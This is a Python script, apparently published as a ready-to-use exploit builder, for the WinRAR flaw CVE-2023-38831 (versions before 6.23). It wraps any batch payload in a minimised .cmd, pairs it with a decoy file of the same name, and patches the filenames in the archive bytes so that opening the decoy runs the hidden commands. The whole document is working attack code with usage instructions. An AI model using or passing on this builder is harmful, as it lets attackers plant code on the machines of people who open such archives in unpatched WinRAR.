import os, sys
from os.path import join
import shutil

def clean_temps():
    print("[+] Remove Cache Files...")
    if os.path.exists(template_folder):
        shutil.rmtree(template_folder)
    if os.path.exists(template_folder + ".zip"):
        print("[+] Delete a zip file...")
        os.remove(template_folder + ".zip")
    try:
        os.remove("commands_temp.bat")
    except:
        print("[X] Can't remove commands_temp.bat")

template_folder = "template_folder"
output_filename = ""
original_filename = ""
script_filename = ""

print("""
   ___   __   __   ___             ___      __     ___     ____            ____    ___     ___     ____     _    
  / __|  \ \ / /  | __|    ___    |_  )    /  \   |_  )   |__ /    ___    |__ /   ( _ )   ( _ )   |__ /    / |   
 | (__    \ V /   | _|    |___|    / /    | () |   / /     |_ \   |___|    |_ \   / _ \   / _ \    |_ \    | |   
  \___|    \_/    |___|           /___|   _\__/   /___|   |___/           |___/   \___/   \___/   |___/    |_| BY MD.

RARLabs WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive.
This was exploited in the wild in April through August 2023.
""")
if len(sys.argv) > 3:
    original_filename = os.path.basename(sys.argv[1])
    script_filename = os.path.basename(sys.argv[2])
    output_filename = os.path.basename(sys.argv[3])
else:
    script_path = os.path.abspath(__file__)
    script_name = os.path.basename(script_path)
    print("Usage: python .\\"+script_name+" <original_filename> <script_filename> <output_filename>")
    sys.exit()

cmd = """
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
=====PAYLOAD=====
exit
"""

clean_temps()

# Read commands from batch file
try:
    print("[+] Read commands from batch file ("+script_filename+")")
    f = open(script_filename,"r")
    content = f.read()
    f.close()
except:
    print("[X] Not found script_filename..")
    sys.exit()

# Create a new commands scripts command_temp.bat
try:
    print("[+] Create a new commands script (command_temp.bat)")
    with open("commands_temp.bat", "w") as f:
        cmd = cmd.replace("=====PAYLOAD=====",content+" & "+original_filename)
        f.write(cmd)
except:
    print("[X] Can't create a commands_temp file..")
    sys.exit()

original_ext = b"."+bytes(original_filename.split(".")[-1], "utf-8")

# Create a new folder
try:
    print("[+] Create a new folder...")
    os.mkdir(template_folder)
    d = join(template_folder,original_filename+"A")
    if not os.path.exists(d):
        os.mkdir(d)
except:
    print("[X] Can't create a folder for template..")
    sys.exit()

# Copy commands_temp and the original file
try:
    print("[+] Copy commands_temp and the original file...")
    shutil.copyfile(join("commands_temp.bat"),join(d,original_filename+"A.cmd"))
    shutil.copyfile(join(original_filename),join(template_folder, original_filename+"B"))
except:
    print("[X] Can't copy commands_temp to template_folder..")
    sys.exit()

# Create a zip archive
try:
    print("[+] Create a zip file...")
    shutil.make_archive(template_folder,'zip',template_folder)
    with open(template_folder+".zip","rb") as f:
        content = f.read()
        content = content.replace(original_ext+b"A",original_ext+b" ")
        content = content.replace(original_ext+b"B",original_ext+b" ")
except:
    print("[X] Can't create a zip file..")
    sys.exit()
    
# Create a rar file
try:
    print("[+] Get the content from the temp zip & Create a final rar file...")
    with open(output_filename,"wb") as f:
        f.write(content)
except:
    print("[X] Can't create a rar file..")
    sys.exit()

# Clean Part
clean_temps()

print("[+] Done.")
